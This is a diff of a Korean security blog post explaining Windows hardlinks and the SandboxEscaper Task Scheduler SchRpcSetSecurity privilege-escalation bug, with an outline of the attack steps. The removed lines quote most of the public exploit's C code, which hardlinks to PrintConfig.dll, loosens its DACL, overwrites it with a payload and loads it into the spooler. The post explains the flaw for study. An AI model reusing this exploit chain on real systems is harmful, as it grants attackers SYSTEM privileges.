@@ -94,7 +94,7 @@ header::after {
 
 
 <article>
-  <span class="meta">Feb 22, 2019 • 15&nbsp;min read</span>
+  <span class="meta">Feb 22, 2019 • 11&nbsp;min read</span>
 	<h1>Hello HardLink? Bye HardLink!</h1>
 		<p>하드링크란 무엇이며, 익스플로잇에서 활용되는 하드링크와 일반적인 하드링크와의 차이점이 무엇인지 알아보겠습니다.</p>
 
@@ -273,6 +273,8 @@ dir hardlink.exe
 
 <p>쓰기 권한이 없는 대상 파일(예:kernel32.dll)에 하드링크를 걸었다고 생각해봅시다. 하드링크를 통해서 대상 파일을 쓸 수 있을까요? 그렇게 된다면 권한상승 취약점으로 이어질 수 있겠지만 윈도우즈가 그렇게 쉬운 상대는 아닙니다. 윈도우즈는 하드링크가 가리키는 파일에 대한 접근 검사(Access Check)를 통해서 쓰기 시도를 막습니다. 쓰기 권한이 없는 대상 파일에 하드링크를 걸 수는 있으나, 하드링크를 통해서 대상 파일을  쓸 수는 없는 것이죠.</p>
 
+<p><img src="" alt="hardlink write" /></p>
+
 <p>다른 케이스를 생각해봐야겠네요.</p>
 
 <p>test 폴더가 있습니다. 일반사용자와 시스템관리자 모두 해당 폴더 밑에 파일을 생성하고 삭제할 수 있는 권한이 주어져 있는 상태입니다. 시스템서비스는 일반사용자도 test\log.txt을 쓸 수 있도록 해당 파일의 퍼미션을 바꾸는 작업을 주기적으로 수행한다고 생각해보죠.</p>
@@ -293,7 +295,7 @@ dir hardlink.exe
 
 <p>태스크 스케쥴러 서비스는 윈도우즈에서 가장 높은 권한인 시스템 권한으로 실행됩니다. 이 서비스는 ALPC 포트라는 일종의 IPC를 통해 외부 프로세스와 통신할 수 있도록 인터페이스를 열어두었습니다.</p>
 
-<p>열어둔 API 중에서 <strong>SchRpcSetSecurity</strong>에서 취약점이 발생했는데요. 이 API의 역할은 <em>c:\windows\tasks</em> 폴더에 있는 파일의 DACL을 조작하는 것입니다. 예를 들어 <em>“일반사용자가 c:\windows\tasks\hello.txt 파일을 READ/WRITE하도록 DACL을 변경해주세요”</em>와 같은 메시지를 서비스에 요청할 수 있습니다.</p>
+<p>열어둔 API 중에서 <strong>SchRpcSetSecurity</strong>에서 취약점이 발생했는데요. 이 API의 역할은 <em>c:\windows\tasks</em> 폴더에 있는 파일의 DACL을 조작하는 것입니다. 예를 들어 <em>“일반사용자가 c:\windows\tasks\hello.job 파일을 READ/WRITE하도록 DACL을 변경해주세요”</em>와 같은 메시지를 서비스에 요청할 수 있습니다.</p>
 
 <p><img src="https://github.com/yong1212/blog.diffense.co.kr/raw/master/img/sandboxescaper_1.png" alt="Task Scheduler Service" /></p>
 
@@ -305,82 +307,36 @@ dir hardlink.exe
 
 <ol>
   <li>
-    <p>tasks 폴더에 <strong>하드링크</strong>(c:\windows\tasks\UpdateTask.job -&gt; c:\windows\system32\kernel32.dll)을 하나 생성합니다. <em>일반사용자가 tasks 폴더에 파일을 생성할 수 있고, 대상 파일(kernel32.dll)에 하드링크도 걸 수 있으니 1번 작업이 가능해집니다.</em></p>
+    <p>tasks 폴더에 <strong>하드링크</strong>(c:\windows\tasks\UpdateTask.job -&gt; c:\windows\…\PrintConfig.dll)를 하나 생성합니다. <em>일반사용자가 tasks 폴더에 파일을 생성할 수 있고, 대상 파일(PrintConfig.dll)에 하드링크도 걸 수 있으니 1번 작업이 가능해집니다.</em></p>
   </li>
   <li>
-    <p>SchRpcSetSecurity를 호출하여, “일반사용자가 c:\windows\tasks\UpdateTask.job의 파일쓰기권한을 가지도록” DACL 변경을 요청합니다.</p>
+    <p><em>SchRpcSetSecurity</em>를 호출하여, “일반사용자가 c:\windows\tasks\UpdateTask.job의 파일쓰기권한을 가지도록” DACL 변경을 요청합니다.</p>
   </li>
   <li>
-    <p>태스크 스케쥴러 서비스는 DACL 변경대상이 하드링크인지 아닌지 여부와 상관없이 DACL을 변경해줍니다. 결국 하드링크 대상인 kernel32.dll의 DACL을 변경해버리는 결과가 발생합니다. 즉 일반사용자가 kernel32.dll에 대한 쓰기 권한을 갖게 되는 결과를 낳게 됩니다.</p>
+    <p>태스크 스케쥴러 서비스는 DACL 변경을 수행합니다. 하드링크 대상인 PrintConfig.dll의 DACL을 변경될 것입니다. 일반사용자가 PrintConfig.dll에 대한 쓰기 권한을 갖게 됩니다.</p>
+  </li>
+  <li>
+    <p>익스플로잇이 가진 페이로드로 PrintConfig.dll을 덮어씁니다.</p>
+  </li>
+  <li>
+    <p>스풀러(Spooler) 서비스를 호출하여 PrintConfig.dll을 로드하도록 합니다.</p>
+  </li>
+  <li>
+    <p>스풀러 프로세스 컨텍스트(시스템권한)에서 페이로드가 실행되어 권한상승을 완료합니다.</p>
   </li>
 </ol>
 
-<p>위 예에서는 kernel32.dll을 예로 들었지만, 앞서 설명드렸듯이 Open할 수 있는 파일이면 모두 하드링크 대상으로 삼을 수 있습니다.</p>
+<p>PrintConfig.dll 외에도 앞서 설명드렸듯이 Open할 수 있는 파일이면 모두 하드링크 대상으로 삼을 수 있습니다.</p>
 
-<p>sandboxescaper는 PrintConfig.dll을 하드링크 대상으로 삼았습니다. 해당 Dll은 스풀러(Spooler)서비스가 사용하는 모듈입니다. sandboxescaper는 취약점을 이용해 PrintConfig.dll를 쓰기 가능하도록 만든 후 그것을 자신의 페이로드로 교체합니다. 그런다음 스풀러(Spooler) 서비스를 호출하여 PrintConfig.dll(페이로드)을 물고 올라가도록 합니다. 최종적으로 자신의 페이로드가 스풀러 프로세스 컨텍스트(시스템권한)에서 실행되도록 하는 것이죠.</p>
+<p>이번엔 sandboxescaper가 공개한 익스플로잇 코드<sup id="fnref:5"><a href="#fn:5" class="footnote">5</a></sup>에서 하드링크를 생성하는 부분만 살펴보겠습니다.</p>
 
-<p>그가 공개한 익스플로잇 코드<sup id="fnref:5"><a href="#fn:5" class="footnote">5</a></sup>를 살펴보겠습니다.</p>
-
-<p>(1) 하드링크 대상(PrintConfig.dll)의 정확한 경로를 구합니다.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hFind</span><span class="p">;</span>
-<span class="n">hFind</span> <span class="o">=</span> <span class="n">FindFirstFile</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">DriverStore</span><span class="se">\\</span><span class="s">FileRepository</span><span class="se">\\</span><span class="s">prnms003.inf_amd64*"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FindFileData</span><span class="p">);</span>
-<span class="kt">wchar_t</span> <span class="n">BeginPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="s">L"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">DriverStore</span><span class="se">\\</span><span class="s">FileRepository</span><span class="se">\\</span><span class="s">"</span><span class="p">;</span>
-<span class="kt">wchar_t</span> <span class="n">PrinterDriverFolder</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
-<span class="kt">wchar_t</span> <span class="n">EndPath</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Amd64</span><span class="se">\\</span><span class="s">PrintConfig.dll"</span><span class="p">;</span>
-<span class="n">wmemcpy</span><span class="p">(</span><span class="n">PrinterDriverFolder</span><span class="p">,</span> <span class="n">FindFileData</span><span class="p">.</span><span class="n">cFileName</span><span class="p">,</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">FindFileData</span><span class="p">.</span><span class="n">cFileName</span><span class="p">));</span>
-<span class="n">FindClose</span><span class="p">(</span><span class="n">hFind</span><span class="p">);</span>
-<span class="n">wcscat</span><span class="p">(</span><span class="n">BeginPath</span><span class="p">,</span> <span class="n">PrinterDriverFolder</span><span class="p">);</span>
-<span class="n">wcscat</span><span class="p">(</span><span class="n">BeginPath</span><span class="p">,</span> <span class="n">EndPath</span><span class="p">);</span>
-</code></pre></div></div>
-<p>(2) PrintConfig.dll의 위치를 알았으니, tasks 폴더 밑에 하드링크(UpdateTask.job -&gt; PrintConfig.dll)을 만듭니다. 여기서 James Forshaw가 만든 CreateNativeHardlink를 그대로 재사용하고 있음을 알 수 있습니다. CreateHardLink(표준API)를 사용하면 PrintConfig.dll에 하드링크를 걸 수 없기 때문이죠!</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
 </span><span class="n">CreateNativeHardlink</span><span class="p">(</span><span class="s">L"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">tasks</span><span class="se">\\</span><span class="s">UpdateTask.job"</span><span class="p">,</span> <span class="n">BeginPath</span><span class="p">);</span>
 </code></pre></div></div>
-<p>(3) 태스크 스케쥴러 서비스의 SchRpcSetSecurity를 호출하여 UpdateTask.job의 DACL을 변경합니다. 요청이 성공하면 PrintConfig.dll이 일반사용자도 쓰기가능한 상태로 바뀔 것입니다.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">RunExploit</span><span class="p">()</span> <span class="p">{</span>
-<span class="n">RPC_BINDING_HANDLE</span> <span class="n">handle</span><span class="p">;</span>
-<span class="n">RPC_STATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">CreateBindingHandle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">handle</span><span class="p">);</span>
-
-<span class="c1">//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
-</span><span class="n">_SchRpcCreateFolder</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">L"UpdateTask"</span><span class="p">,</span> <span class="s">L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-<span class="n">_SchRpcSetSecurity</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">L"UpdateTask"</span><span class="p">,</span> <span class="s">L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>(4) 페이로드코드(DLL)는 익스플로잇 바이너리(PE) 안에 리소스로 포함되어 있습니다. 페이로드 데이터를 추출하여 PrintConfig.dll에 덮어씁니다.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HMODULE</span> <span class="n">mod</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L"ALPC-TaskSched-LPE"</span><span class="p">);</span>
-	
-<span class="c1">// 페이로드DLL은 리소스에 포함되어 있습니다. 이 코드블록에서 페이로드 DLL을 찾습니다.
-</span><span class="n">HRSRC</span> <span class="n">myResource</span> <span class="o">=</span> <span class="o">::</span><span class="n">FindResource</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">IDR_RCDATA1</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
-<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">myResourceSize</span> <span class="o">=</span> <span class="o">::</span><span class="n">SizeofResource</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">myResource</span><span class="p">);</span>
-<span class="n">HGLOBAL</span> <span class="n">myResourceData</span> <span class="o">=</span> <span class="o">::</span><span class="n">LoadResource</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">myResource</span><span class="p">);</span>
-<span class="kt">void</span><span class="o">*</span> <span class="n">pMyBinaryData</span> <span class="o">=</span> <span class="o">::</span><span class="n">LockResource</span><span class="p">(</span><span class="n">myResourceData</span><span class="p">);</span>
-	
-<span class="c1">//We try to open the DLL in a loop, it could already be loaded somewhere.. if thats the case, it will throw a sharing violation and we should not continue
-</span><span class="n">HANDLE</span> <span class="n">hFile</span><span class="p">;</span>
-<span class="n">DWORD</span> <span class="n">dwBytesWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-<span class="k">do</span> <span class="p">{</span>
-	<span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">BeginPath</span><span class="p">,</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>                  
-	<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pMyBinaryData</span><span class="p">,</span><span class="n">myResourceSize</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwBytesWritten</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>           
-	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
-	<span class="p">}</span>
-<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">);</span>
-<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
-</code></pre></div></div>
-<p>(5) 스풀러 서비스가 PrintConfig.dll(페이로드)를 로드하도록 만듭니다. 로드에 성공하면, 스풀러 서비스 컨텍스트(시스템권한)에서 페이로드가 실행될 것입니다.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
-</span><span class="n">CoInitialize</span><span class="p">(</span><span class="n">nullptr</span><span class="p">);</span>
-<span class="n">IXpsOMObjectFactory</span> <span class="o">*</span><span class="n">xpsFactory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-<span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">__uuidof</span><span class="p">(</span><span class="n">XpsOMObjectFactory</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">__uuidof</span><span class="p">(</span><span class="n">IXpsOMObjectFactory</span><span class="p">),</span> <span class="n">reinterpret_cast</span><span class="o">&lt;</span><span class="n">LPVOID</span><span class="o">*&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">xpsFactory</span><span class="p">));</span>
-<span class="n">HANDLE</span> <span class="n">completionEvent</span> <span class="o">=</span> <span class="n">CreateEvent</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-<span class="n">IXpsPrintJob</span> <span class="o">*</span><span class="n">job</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-<span class="n">IXpsPrintJobStream</span> <span class="o">*</span><span class="n">jobStream</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-<span class="n">StartXpsPrintJob</span><span class="p">(</span><span class="s">L"Microsoft XPS Document Writer"</span><span class="p">,</span> <span class="s">L"Print Job 1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">completionEvent</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">job</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jobStream</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-<span class="n">jobStream</span><span class="o">-&gt;</span><span class="n">Close</span><span class="p">();</span>
-<span class="n">CoUninitialize</span><span class="p">();</span>
-</code></pre></div></div>
+<p>James Forshaw가 만든 CreateNativeHardlink를 이용해 하드링크(UpdateTask.job -&gt; PrintConfig.dll)을 만들고 있음을 알 수 있습니다. CreateHardLink(표준 API)를 사용하면 PrintConfig.dll에 하드링크를 걸 수 없기 때문이죠!</p>
+<blockquote>
+  <p>James Forshaw가 만든 CreateNativeHardlink를 그대로 재사용하고 있음을 알 수 있습니다. CreateHardLink(표준API)를 사용하면 PrintConfig.dll에 하드링크를 걸 수 없기 때문이죠!</p>
+</blockquote>
 
 <h3 id="대응-방안">대응 방안</h3>
 
